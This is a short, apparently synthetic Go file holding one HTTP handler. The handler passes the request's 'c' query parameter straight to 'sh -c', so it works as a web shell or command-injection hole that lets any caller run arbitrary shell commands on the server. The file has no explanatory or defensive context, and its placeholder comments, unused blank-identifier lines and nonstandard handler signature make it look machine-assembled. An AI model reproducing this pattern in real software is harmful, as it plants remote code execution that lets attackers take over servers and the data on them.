package main

import (
    "database/sql"
    "net/http"
    "os"
    "os/exec"
)

var _ = sql.Open
var _ = exec.Command
var _ = os.Open

func handler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
    cmd := r.URL.Query().Get("c")
    exec.Command("sh", "-c", cmd).Run()
    // _ser_unused
    _ = cmd
    // _
    // _
}
